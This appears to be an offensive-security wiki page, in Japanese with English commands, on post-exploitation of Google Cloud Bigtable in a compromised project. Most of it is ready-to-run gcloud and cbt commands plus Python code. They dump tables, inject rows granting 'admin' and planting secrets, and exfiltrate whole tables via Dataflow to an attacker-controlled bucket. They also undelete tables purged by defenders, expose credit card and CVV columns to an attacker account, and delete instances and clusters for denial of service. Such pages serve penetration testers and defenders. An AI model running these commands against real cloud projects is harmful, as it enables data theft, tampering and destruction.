# GCP - Bigtable Post Exploitation

{{#include ../../../banners/hacktricks-training.md}}

## Bigtable

Bigtable の詳細は次を参照してください:

{{#ref}}
../gcp-services/gcp-bigtable-enum.md
{{#endref}}

> [!TIP]
> 以下のコマンドをローカルで動作させるため、`cbt` CLI を Cloud SDK 経由で一度インストールしてください:
>
> ```bash
> gcloud components install cbt
> ```

### 行の読み取り

**権限:** `bigtable.tables.readRows`

`cbt` は Cloud SDK に同梱されており、ミドルウェアを必要とせず管理/データ API に直接アクセスできます。侵害されたプロジェクト/インスタンスを指定してテーブルから直接行をダンプしてください。ちらっと見るだけならスキャン範囲を制限してください。
```bash
# Install cbt
gcloud components update
gcloud components install cbt

# Read entries with creds of gcloud
cbt -project=<victim-proj> -instance=<instance-id> read <table-id>
```
### 行の書き込み

**Permissions:** `bigtable.tables.mutateRows`, (変更を確認するには `bigtable.tables.readRows` が必要です)。

同じツールを使って任意のセルを upsert できます。これは configs に backdoor を仕込み、web shells を drop したり、poisoned dataset rows を植える最も手早い方法です。
```bash
# Inject a new row
cbt -project=<victim-proj> -instance=<instance-id> set <table> <row-key> <family>:<column>=<value>

cbt -project=<victim-proj> -instance=<instance-id> set <table-id> user#1337 profile:name="Mallory" profile:role="admin" secrets:api_key=@/tmp/stealme.bin

# Verify the injected row
cbt -project=<victim-proj> -instance=<instance-id> read <table-id> rows=user#1337
```
`cbt set` は `@/path` 構文で生のバイト列を受け取るため、compiled payloads や serialized protobufs を下流サービスが期待する形式でそのままプッシュできます。

### 行をあなたのバケットにダンプする

**Permissions:** `dataflow.jobs.create`, `resourcemanager.projects.get`, `iam.serviceAccounts.actAs`

Dataflow ジョブを起動して行をあなたが管理する GCS バケットへストリームすることで、テーブル全体の内容を攻撃者が管理するバケットへ外部へ持ち出すことが可能です。

> [!NOTE]
> エクスポートを実行する十分な権限を持つ SA に対して `iam.serviceAccounts.actAs` の権限が必要です（デフォルトでは、特に指定がない限り default compute SA が使用されます）。
```bash
gcloud dataflow jobs run <job-name> \
--gcs-location=gs://dataflow-templates-us-<REGION>/<VERSION>/Cloud_Bigtable_to_GCS_Json \
--project=<PROJECT> \
--region=<REGION> \
--parameters=<PROJECT>,bigtableInstanceId=<INSTANCE_ID>,bigtableTableId=<TABLE_ID>,filenamePrefix=<PREFIX>,outputDirectory=gs://<BUCKET>/raw-json/ \
--staging-location=gs://<BUCKET>/staging/

# Example
gcloud dataflow jobs run dump-bigtable3 \
--gcs-location=gs://dataflow-templates-us-central1/latest/Cloud_Bigtable_to_GCS_Json \
--project=gcp-labs-3uis1xlx \
--region=us-central1 \
--parameters=bigtableProjectId=gcp-labs-3uis1xlx,bigtableInstanceId=avesc-20251118172913,bigtableTableId=prod-orders,filenamePrefix=prefx,outputDirectory=gs://deleteme20u9843rhfioue/raw-json/ \
--staging-location=gs://deleteme20u9843rhfioue/staging/
```
> [!NOTE]
> JSONの代わりにParquet/SequenceFile出力が必要な場合は、テンプレートを`Cloud_Bigtable_to_GCS_Parquet`または`Cloud_Bigtable_to_GCS_SequenceFile`に切り替えてください。権限は同じで、テンプレートのパスだけが変わります。

### 行のインポート

**権限:** `dataflow.jobs.create`, `resourcemanager.projects.get`, `iam.serviceAccounts.actAs`

攻撃者が制御するバケットからテーブル全体の内容をインポートすることは可能で、行をあなたが管理するGCSバケットにストリーミングするDataflowジョブを起動することで実現できます。このため、攻撃者はまず期待されるスキーマでインポートするデータを含むparquetファイルを作成する必要があります。攻撃者は前述の手法に従い`Cloud_Bigtable_to_GCS_Parquet`設定でデータをparquet形式でエクスポートし、ダウンロードしたparquetファイルに新しいエントリを追加することができます。



> [!NOTE]
> エクスポートを実行するのに十分な権限を持つ Service Account (SA) に対して、`iam.serviceAccounts.actAs` の権限が必要であることに注意してください（デフォルトでは特に指定がない限り、デフォルトの compute SA が使用されます）。
```bash
gcloud dataflow jobs run import-bt-$(date +%s) \
--region=<REGION> \
--gcs-location=gs://dataflow-templates-<REGION>/<VERSION>>/GCS_Parquet_to_Cloud_Bigtable \
--project=<PROJECT> \
--parameters=bigtableProjectId=<PROJECT>,bigtableInstanceId=<INSTANCE-ID>,bigtableTableId=<TABLE-ID>,inputFilePattern=gs://<BUCKET>/import/bigtable_import.parquet \
--staging-location=gs://<BUCKET>/staging/

# Example
gcloud dataflow jobs run import-bt-$(date +%s) \
--region=us-central1 \
--gcs-location=gs://dataflow-templates-us-central1/latest/GCS_Parquet_to_Cloud_Bigtable \
--project=gcp-labs-3uis1xlx \
--parameters=bigtableProjectId=gcp-labs-3uis1xlx,bigtableInstanceId=avesc-20251118172913,bigtableTableId=prod-orders,inputFilePattern=gs://deleteme20u9843rhfioue/import/parquet_prefx-00000-of-00001.parquet \
--staging-location=gs://deleteme20u9843rhfioue/staging/
```
### バックアップの復元

**権限:** `bigtable.backups.restore`, `bigtable.tables.create`.

これらの権限を持つ攻撃者は、自分が管理する新しいテーブルにバックアップを復元して、古い機密データを回復できるようになります。
```bash
gcloud bigtable backups list --instance=<INSTANCE_ID_SOURCE> \
--cluster=<CLUSTER_ID_SOURCE>

gcloud bigtable instances tables restore \
--source=projects/<PROJECT_ID_SOURCE>/instances/<INSTANCE_ID_SOURCE>/clusters/<CLUSTER_ID>/backups/<BACKUP_ID> \
--async \
--destination=<TABLE_ID_NEW> \
--destination-instance=<INSTANCE_ID_DESTINATION> \
--project=<PROJECT_ID_DESTINATION>
```
### テーブルの復元

**権限:** `bigtable.tables.undelete`

Bigtable はグレース期間（通常デフォルトで7日）付きのソフト削除をサポートしています。この期間中、`bigtable.tables.undelete` 権限を持つ攻撃者は最近削除されたテーブルを復元して全データを回復でき、破棄されたと思われていた機密情報にアクセスする可能性があります。

特に次の目的で有用です:
- incident response 中に防御者が削除したテーブルからデータを復元するため
- 意図的にパージされた履歴データにアクセスするため
- 偶発的または悪意ある削除を元に戻して persistence を維持するため
```bash
# List recently deleted tables (requires bigtable.tables.list)
gcloud bigtable instances tables list --instance=<instance-id> \
--show-deleted

# Undelete a table within the retention period
gcloud bigtable instances tables undelete <table-id> \
--instance=<instance-id>
```
> [!NOTE]
> undelete 操作は設定された保持期間（デフォルトは 7 日）内でのみ機能します。このウィンドウが経過すると、テーブルとそのデータは完全に削除され、この方法では回復できません。

### Authorized Views を作成する

**権限:** `bigtable.authorizedViews.create`, `bigtable.tables.readRows`, `bigtable.tables.mutateRows`

Authorized views を使うと、テーブルのキュレーションされたサブセットを提示できます。最小権限を尊重する代わりに、関心のある機微なカラム/行のセットだけを正確に公開し、自分のプリンシパルをホワイトリスト化するために使用します。

> [!WARNING]
> Authorized view を作成するには、ベーステーブルの行を読み取りおよび変更できる必要があるため、追加の権限は得られません。したがって、この手法はほとんど役に立ちません。
```bash
cat <<'EOF' > /tmp/credit-cards.json
{
"subsetView": {
"rowPrefixes": ["acct#"],
"familySubsets": {
"pii": {
"qualifiers": ["cc_number", "cc_cvv"]
}
}
}
}
EOF

gcloud bigtable authorized-views create card-dump \
--instance=<instance-id> --table=<table-id> \
--definition-file=/tmp/credit-cards.json

gcloud bigtable authorized-views add-iam-policy-binding card-dump \
--instance=<instance-id> --table=<table-id> \
--member='user:<attacker@example.com>' --role='roles/bigtable.reader'
```
アクセスが view にスコープされるため、防御側は新たに機密性の高いエンドポイントを作成したことを見落としがちです。

### Read Authorized Views

**Permissions:** `bigtable.authorizedViews.readRows`

Authorized View へのアクセス権がある場合、read リクエストで authorized view 名を指定して Bigtable client libraries を使い、そのデータを読み取ることができます。authorized view はテーブルからアクセスできる内容を制限する可能性がある点に注意してください。以下は Python を使用した例です:
```python
from google.cloud import bigtable
from google.cloud.bigtable_v2 import BigtableClient as DataClient
from google.cloud.bigtable_v2 import ReadRowsRequest

# Set your project, instance, table, view id
PROJECT_ID = "gcp-labs-3uis1xlx"
INSTANCE_ID = "avesc-20251118172913"
TABLE_ID = "prod-orders"
AUTHORIZED_VIEW_ID = "auth_view"

client = bigtable.Client(project=PROJECT_ID, admin=True)
instance = client.instance(INSTANCE_ID)
table = instance.table(TABLE_ID)

data_client = DataClient()
authorized_view_name = f"projects/{PROJECT_ID}/instances/{INSTANCE_ID}/tables/{TABLE_ID}/authorizedViews/{AUTHORIZED_VIEW_ID}"

request = ReadRowsRequest(
authorized_view_name=authorized_view_name
)

rows = data_client.read_rows(request=request)
for response in rows:
for chunk in response.chunks:
if chunk.row_key:
row_key = chunk.row_key.decode('utf-8') if isinstance(chunk.row_key, bytes) else chunk.row_key
print(f"Row: {row_key}")
if chunk.family_name:
family = chunk.family_name.value if hasattr(chunk.family_name, 'value') else chunk.family_name
qualifier = chunk.qualifier.value.decode('utf-8') if hasattr(chunk.qualifier, 'value') else chunk.qualifier.decode('utf-8')
value = chunk.value.decode('utf-8') if isinstance(chunk.value, bytes) else str(chunk.value)
print(f"  {family}:{qualifier} = {value}")
```
### Denial of Service via Delete Operations

**権限:** `bigtable.appProfiles.delete`, `bigtable.authorizedViews.delete`, `bigtable.authorizedViews.deleteTagBinding`, `bigtable.backups.delete`, `bigtable.clusters.delete`, `bigtable.instances.delete`, `bigtable.tables.delete`

Bigtable の削除権限はいずれも denial of service 攻撃に悪用され得ます。これらの権限を持つ攻撃者は、重要な Bigtable リソースを削除することで運用を妨害できます:

- **`bigtable.appProfiles.delete`**: アプリケーションプロファイルを削除し、クライアント接続やルーティング設定を破壊する
- **`bigtable.authorizedViews.delete`**: 承認済みビューを削除し、アプリケーションの正当なアクセス経路を遮断する
- **`bigtable.authorizedViews.deleteTagBinding`**: 承認済みビューからタグバインディングを削除する
- **`bigtable.backups.delete`**: バックアップスナップショットを破壊し、ディザスタリカバリの手段を失わせる
- **`bigtable.clusters.delete`**: クラスタ全体を削除し、即時にデータが利用不能になる
- **`bigtable.instances.delete`**: Bigtable インスタンスを丸ごと削除し、すべてのテーブルと設定を消失させる
- **`bigtable.tables.delete`**: 個々のテーブルを削除し、データ損失やアプリケーション障害を引き起こす
```bash
# Delete a table
gcloud bigtable instances tables delete <table-id> \
--instance=<instance-id>

# Delete an authorized view
gcloud bigtable authorized-views delete <view-id> \
--instance=<instance-id> --table=<table-id>

# Delete a backup
gcloud bigtable backups delete <backup-id> \
--instance=<instance-id> --cluster=<cluster-id>

# Delete an app profile
gcloud bigtable app-profiles delete <profile-id> \
--instance=<instance-id>

# Delete a cluster
gcloud bigtable clusters delete <cluster-id> \
--instance=<instance-id>

# Delete an entire instance
gcloud bigtable instances delete <instance-id>
```
> [!WARNING]
> 削除操作は多くの場合即時かつ元に戻せません。これらのコマンドをテストする前にバックアップが存在することを確認してください。恒久的なデータ損失や深刻なサービス障害を引き起こす可能性があります。
  
{{#include ../../../banners/hacktricks-training.md}}
